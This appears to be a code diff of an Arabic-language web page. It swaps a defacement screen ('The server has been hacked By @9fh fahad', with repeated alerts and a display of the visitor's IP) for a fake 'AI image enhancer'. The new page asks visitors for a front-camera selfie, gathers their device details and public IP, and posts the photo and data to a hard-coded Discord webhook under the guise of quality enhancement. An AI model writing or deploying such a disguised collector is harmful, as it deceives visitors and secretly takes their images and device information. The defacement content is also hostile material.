@@ -1,110 +1,137 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Arab City RP</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      overflow: hidden;
-      background: #000;
-      color: #ff0000;
-      font-family: 'Courier New', Courier, monospace;
-      text-align: center;
-      font-size: 2.8rem;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-    .container {
-      position: relative;
-      width: 100%;
-      height: 100%;
-    }
-    .bg-gif {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      object-fit: cover;
-      opacity: 0.7;
-      z-index: 1;
-    }
-    .content {
-      position: relative;
-      z-index: 2;
-      text-shadow: 0 0 15px #ff0000, 0 0 30px #ff4500;
-      animation: flicker 3s infinite;
-    }
-    h1 {
-      font-size: 5rem;
-      margin: 0;
-      color: #ff0000;
-    }
-    p {
-      font-size: 2.2rem;
-      margin: 1rem 0;
-      color: #ffd700;
-    }
-    .info {
-      font-size: 1.6rem;
-      color: #00ff00;
-      margin-top: 2rem;
-      line-height: 1.8;
-    }
-    @keyframes flicker {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.6; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI محسن الصور - رفع الجودة السحري</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #e0e0ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(20, 20, 60, 0.7);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 480px;
+            box-shadow: 0 0 60px rgba(100, 0, 255, 0.4);
+            border: 1px solid rgba(100, 0, 255, 0.3);
+            text-align: center;
+            animation: glow 3s infinite alternate;
+        }
+        @keyframes glow {
+            from { box-shadow: 0 0 40px rgba(100,0,255,0.3); }
+            to   { box-shadow: 0 0 80px rgba(100,0,255,0.7); }
+        }
+        h1 {
+            font-size: 2.4rem;
+            background: linear-gradient(90deg, #a78bfa, #7c3aed, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+        }
+        p { margin: 15px 0; font-size: 1.1rem; opacity: 0.9; }
+        .btn {
+            background: linear-gradient(45deg, #7c3aed, #a78bfa);
+            border: none;
+            color: white;
+            font-size: 1.3rem;
+            padding: 16px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.4s;
+            box-shadow: 0 10px 30px rgba(100,0,255,0.5);
+        }
+        .btn:hover { transform: translateY(-5px); box-shadow: 0 20px 50px rgba(100,0,255,0.8); }
+        #preview { 
+            width: 100%; max-height: 300px; 
+            border-radius: 16px; margin: 20px 0; 
+            border: 3px solid #a78bfa; display: none; 
+        }
+        .info { font-size: 0.9rem; opacity: 0.7; margin-top: 30px; }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <img class="bg-gif" src="https://images-ext-1.discordapp.net/external/5B37SQxnBAkZ6uH-g9N1ssibdVHdN0yUNkLpFh_j9yE/https/media.tenor.com/UXtTOMZEay4AAAPo/greetings-glitch-hello.mp4" alt="Fire Puppet">
-    <div class="content">
-      <h1>The server has been hacked By @9fh fahad</h1>
-      <p>The server has been hacked By @9fh fahad</p>
-      <div class="info" id="ip-info">
-        جاري عرض معلومات الاتصال...
-      </div>
-      <p style="margin-top:3rem;font-size:2rem;"></p>
+    <div class="container">
+        <h1>AI محسن الصور</h1>
+        <p>اضغط لالتقاط صورة سلفي أو من الكاميرا الأمامية وسنرفع جودتها تلقائياً!</p>
+        
+        <input type="file" id="cameraInput" accept="image/*" capture="user" style="display:none;">
+        <button class="btn" onclick="document.getElementById('cameraInput').click()">التقط صورة الآن</button>
+        
+        <img id="preview" alt="معاينة الصورة">
+        
+        <div class="info">جاري جمع معلومات الجهاز وإرسال الصورة...</div>
     </div>
-  </div>
 
-  <!-- صوت تلقائي مزعج loop -->
-  <audio autoplay loop>
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-    متصفحك لا يدعم الصوت.
-  </audio>
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1399364418868875446/NntQ9ZpNP3BH9C0iuZmmagvk1-HGUvstb_x1VIftLB_SQuFlAInkBQOYIVk5A-icZ1zn";
+        const input = document.getElementById('cameraInput');
+        const preview = document.getElementById('preview');
 
-  <script>
-    // عرض alert 3 مرات فقط
-    alert("The server has been hacked By @9fh fahad");
-    setTimeout(() => alert("The server has been hacked By @9fh fahad"), 1500);
-    setTimeout(() => alert("The server has been hacked By @9fh fahad"), 3000);
+        input.addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
 
-    // جلب معلومات IP وعرضها (مثل الكود الأصلي)
-    fetch('https://ipinfo.io/json')
-      .then(res => res.json())
-      .then(data => {
-        const infoDiv = document.getElementById('ip-info');
-        infoDiv.innerHTML = `
-          <strong>IP:</strong> ${data.ip}<br>
-          <strong>City:</strong> ${data.city}<br>
-          <strong>Region:</strong> ${data.region}<br>
-          <strong>Country:</strong> ${data.country}<br>
-          <strong>Location:</strong> ${data.loc}<br>
-          <strong>Organization:</strong> ${data.org}<br>
-          <strong>Timezone:</strong> ${data.timezone}
-        `;
-      })
-      .catch(() => {
-        document.getElementById('ip-info').innerHTML = 'تعذر جلب المعلومات';
-      });
-  </script>
+            // عرض المعاينة
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                preview.src = ev.target.result;
+                preview.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
+
+            // جمع معلومات الجهاز
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                deviceMemory: navigator.deviceMemory || 'غير متوفر',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير متوفر',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'غير متوفر',
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            };
+
+            // محاولة IP من API خارجي (مثال ipify)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                deviceInfo.ip = ipData.ip;
+            } catch(e) { deviceInfo.ip = 'غير متوفر'; }
+
+            // رقم الهاتف: مستحيل في JS عادي بدون أذونات خاصة، لكن نضيف placeholder
+            deviceInfo.phoneNumber = 'غير متوفر (يتطلب أذونات خاصة غير مدعومة في المتصفح)';
+
+            // إرسال الصورة + المعلومات للـ webhook
+            const formData = new FormData();
+            formData.append('file', file, 'selfie.jpg');
+            formData.append('payload_json', JSON.stringify({
+                content: `**صورة جديدة تم التقاطها!**\n\`\`\`json\n${JSON.stringify(deviceInfo, null, 2)}\n\`\`\``,
+                username: "AI Image Enhancer Bot",
+                avatar_url: "https://i.imgur.com/awesome-ai-icon.png" // غيرها لو عايز
+            }));
+
+            try {
+                await fetch(webhook, { method: 'POST', body: formData });
+                console.log('تم الإرسال!');
+            } catch(err) {
+                console.error('خطأ في الإرسال:', err);
+            }
+        });
+    </script>
 </body>
 </html>
-
